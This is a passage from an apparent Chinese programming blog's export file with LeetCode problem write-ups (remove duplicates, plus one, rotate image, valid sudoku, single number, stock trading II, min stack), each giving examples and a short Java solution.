<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>], </span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">2</span>, 并且原数组 nums 的前两个元素被修改为 <span class="number">1</span>, <span class="number">2</span>。 </span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 nums = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">5</span>, 并且原数组 nums 的前五个元素被修改为 <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以「引用」方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝</span></span><br><span class="line"><span class="keyword">int</span> len = removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在函数里修改输入数组对于调用者是可见的。</span></span><br><span class="line"><span class="comment">// 根据你的函数返回的长度, 它会打印出数组中该长度范围内的所有元素。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>采用快慢指针，一个指向当前元素，一个指向其后一个元素，如果后一个值和当前值相同，再后移，直到两个指针的值不一致为止。交换当前元素后一个位置和后一个指针位置的值，直到数组末尾。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[j] != nums[i]) &#123;</span><br><span class="line">				i++;</span><br><span class="line">				nums[i] = nums[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>66. 加一</title>
    <url>/2020/03/26/LeetCode/leetcode-000066-%E5%8A%A0%E4%B8%80/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个由整数组成的非空数组所表示的非负整数，在该数的基础上加一。</p>
<p>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。</p>
<p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3]</span><br><span class="line">输出: [1,2,4]</span><br><span class="line">解释: 输入数组表示数字 123。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [4,3,2,1]</span><br><span class="line">输出: [4,3,2,2]</span><br><span class="line">解释: 输入数组表示数字 4321。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>加一无外乎两种情况：</p>
<ul>
<li>加上之后没有超过9；</li>
<li>加上之后超过9需要进位</li>
</ul>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">			digits[i]++;</span><br><span class="line">			digits[i] = digits[i] % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> (digits[i] != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> digits;</span><br><span class="line">		&#125;</span><br><span class="line">		digits = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length + <span class="number">1</span>];</span><br><span class="line">		digits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">return</span> digits;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>48. 旋转图像</title>
    <url>/2020/03/26/LeetCode/leetcode-000048-%E6%97%8B%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <em>n</em> × <em>n</em> 的二维矩阵表示一个图像。</p>
<p>将图像顺时针旋转 90 度。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 matrix &#x3D; </span><br><span class="line">[</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [4,5,6],</span><br><span class="line">  [7,8,9]</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">原地旋转输入矩阵，使其变为:</span><br><span class="line">[</span><br><span class="line">  [7,4,1],</span><br><span class="line">  [8,5,2],</span><br><span class="line">  [9,6,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 matrix =</span><br><span class="line">[</span><br><span class="line">  [ <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>,<span class="number">11</span>],</span><br><span class="line">  [ <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>,<span class="number">10</span>],</span><br><span class="line">  [<span class="number">13</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">16</span>]</span><br><span class="line">], </span><br><span class="line"></span><br><span class="line">原地旋转输入矩阵，使其变为:</span><br><span class="line">[</span><br><span class="line">  [<span class="number">15</span>,<span class="number">13</span>, <span class="number">2</span>, <span class="number">5</span>],</span><br><span class="line">  [<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>],</span><br><span class="line">  [<span class="number">12</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">  [<span class="number">16</span>, <span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>你必须在<strong><a href="https://baike.baidu.com/item/原地算法" target="_blank" rel="noopener">原地</a></strong>旋转图像，这意味着你需要直接修改输入的二维矩阵。<strong>请不要</strong>使用另一个矩阵来旋转图像。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：转置-翻转"><a href="#解法一：转置-翻转" class="headerlink" title="解法一：转置+翻转"></a>解法一：转置+翻转</h3><p>转置矩阵，然后翻转每一行</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = matrix.length;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// transpose matrix</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = matrix[j][i];</span><br><span class="line">				matrix[j][i] = matrix[i][j];</span><br><span class="line">				matrix[i][j] = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// reverse each row</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n / <span class="number">2</span>; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = matrix[i][j];</span><br><span class="line">				matrix[i][j] = matrix[i][n - j - <span class="number">1</span>];</span><br><span class="line">				matrix[i][n - j - <span class="number">1</span>] = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>36. 有效的数独</title>
    <url>/2020/03/26/LeetCode/leetcode-000036-%E6%9C%89%E6%95%88%E7%9A%84%E6%95%B0%E7%8B%AC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>判断一个 9x9 的数独是否有效。只需要根据以下规则，验证已经填入的数字是否有效即可。</p>
<pre><code>数字 1-9 在每一行只能出现一次。
数字 1-9 在每一列只能出现一次。
数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。</code></pre><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Sudoku-by-L2G-20050714.svg/250px-Sudoku-by-L2G-20050714.svg.png" alt></p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [&quot;5&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;],</span><br><span class="line">  [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]</span><br><span class="line">]</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [<span class="string">"8"</span>,<span class="string">"3"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"7"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"6"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"1"</span>,<span class="string">"9"</span>,<span class="string">"5"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"9"</span>,<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"6"</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"6"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"3"</span>],</span><br><span class="line">  [<span class="string">"4"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"3"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"1"</span>],</span><br><span class="line">  [<span class="string">"7"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"2"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"6"</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"6"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"2"</span>,<span class="string">"8"</span>,<span class="string">"."</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"4"</span>,<span class="string">"1"</span>,<span class="string">"9"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"5"</span>],</span><br><span class="line">  [<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"8"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"7"</span>,<span class="string">"9"</span>]</span><br><span class="line">]</span><br><span class="line">输出: <span class="keyword">false</span></span><br><span class="line">解释: 除了第一行的第一个数字从 <span class="number">5</span> 改为 <span class="number">8</span> 以外，空格内其他数字均与 示例<span class="number">1</span> 相同。</span><br><span class="line">     但由于位于左上角的 <span class="number">3</span>x3 宫内有两个 <span class="number">8</span> 存在, 因此这个数独是无效的。。</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>一个有效的数独（部分已被填充）不一定是可解的。</li>
<li>只需要根据以上规则，验证已经填入的数字是否有效即可。</li>
<li>给定数独序列只包含数字 1-9 和字符 ‘.’ 。</li>
<li>给定数独永远是 9x9 形式的。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：遍历"><a href="#解法一：遍历" class="headerlink" title="解法一：遍历"></a>解法一：遍历</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidSudoku</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (board == <span class="keyword">null</span> || board.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] != <span class="string">'.'</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!isValidHelp(board, board[i][j], i, j)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidHelp</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">char</span> c, <span class="keyword">int</span> row, <span class="keyword">int</span> column)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (board == <span class="keyword">null</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (board[i][column] == c &amp;&amp; i != row) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; column; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (board[row][i] == c &amp;&amp; i != column) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> n = row / <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">int</span> m = column / <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 注意这里 *3 + 3 开始没注意我合并成 n*4 了 卡了很久</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = n * <span class="number">3</span>; i &lt; n * <span class="number">3</span> + <span class="number">3</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = m * <span class="number">3</span>; j &lt; m * <span class="number">3</span> + <span class="number">3</span>; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] == c) &#123;</span><br><span class="line">					<span class="comment">// 判断是否是自己</span></span><br><span class="line">					<span class="keyword">if</span> (i != row &amp;&amp; j != column) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>136. 只出现一次的数字</title>
    <url>/2020/03/26/LeetCode/leetcode-000136.%20%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1]</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [4,1,2,1,2]</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用异或的特性。<br>任何数和自身异或为0，任何数和0异或，为其本身。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        result ^= nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：优化空间复杂度"><a href="#解法二：优化空间复杂度" class="headerlink" title="解法二：优化空间复杂度"></a>解法二：优化空间复杂度</h3><p>不使用变量result，直接使用数组的第一个元素</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        nums[<span class="number">0</span>] ^= nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>122. 买卖股票的最佳时机 II</title>
    <url>/2020/03/26/LeetCode/leetcode-000122.%20%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p>
<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>
<p>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">输出: <span class="number">7</span></span><br><span class="line">解释: 在第 <span class="number">2</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">3</span> 天（股票价格 = <span class="number">5</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">5</span>-<span class="number">1</span> = <span class="number">4</span> 。</span><br><span class="line">     随后，在第 <span class="number">4</span> 天（股票价格 = <span class="number">3</span>）的时候买入，在第 <span class="number">5</span> 天（股票价格 = <span class="number">6</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">6</span>-<span class="number">3</span> = <span class="number">3</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">输出: <span class="number">4</span></span><br><span class="line">解释: 在第 <span class="number">1</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">5</span> 天 （股票价格 = <span class="number">5</span>）的时候卖出, 这笔交易所能获得利润 = <span class="number">5</span>-<span class="number">1</span> = <span class="number">4</span> 。</span><br><span class="line">     注意你不能在第 <span class="number">1</span> 天和第 <span class="number">2</span> 天接连购买股票，之后再将它们卖出。</span><br><span class="line">     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出: <span class="number">0</span></span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 <span class="number">0</span>。</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>股票必须在卖出去之后才能再次买入。基于这个限制，分析题目可知。针对股票走势[1,2,3,4,5].在第一天以价格1买入，第二天以价格2卖出，第二天以价格2买入，第三天以价格2卖出，所获取的收益，是和第一天以价格1买入，第三天以价格3卖出的收益是一致的，都是2。</p>
<p>因此，是不是只要计算这个数组里面的升序数组之间的差值就行了？</p>
<p>在看看数组[7,1,5,3,4,6]。找出它的升序数组，1，3，4，6。它在1买入，3的时候卖出，再买入，4的时候卖出，再买入，6的时候卖出，所获取的收益就是7。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; ++i) &#123;</span><br><span class="line">			<span class="keyword">int</span> delta = prices[i] - prices[i - <span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span> (delta &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				p += delta;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>155. 最小栈</title>
    <url>/2020/03/26/LeetCode/leetcode-000155-%E6%9C%80%E5%B0%8F%E6%A0%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>设计一个支持 push，pop，top 操作，并能在常数时间内检索到最小元素的栈。</p>
<pre><code>push(x) -- 将元素 x 推入栈中。
pop() -- 删除栈顶的元素。
top() -- 获取栈顶元素。
getMin() -- 检索栈中的最小元素。</code></pre><h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MinStack minStack &#x3D; new MinStack();</span><br><span class="line">minStack.push(-2);</span><br><span class="line">minStack.push(0);</span><br><span class="line">minStack.push(-3);</span><br><span class="line">minStack.getMin();   --&gt; 返回 -3.</span><br><span class="line">minStack.pop();</span><br><span class="line">minStack.top();      --&gt; 返回 0.</span><br><span class="line">minStack.getMin();   --&gt; 返回 -2.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借用Java自带的Stack，使用一个辅助栈，保存当前最小元素。</p>
